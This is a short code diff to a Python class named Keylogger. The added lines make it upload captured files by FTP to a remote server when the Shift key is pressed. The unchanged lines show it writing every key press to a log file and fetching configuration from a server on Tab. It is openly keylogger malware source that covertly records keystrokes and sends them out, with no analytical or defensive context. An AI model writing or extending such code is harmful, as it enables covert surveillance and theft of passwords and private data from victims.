@@ -19,9 +19,12 @@ class Keylogger(Thread):
         try:
             if key == Key.tab:
                 self.__communication.getConfigFromServer()
+            elif key == Key.shift:
+                self.__communication.uploadFilesFTP()
         except Exception:
             pass
         Util.fileOut(self.__config.logPath + self.__config.logFileName, key)
+
 
 
     def run(self):
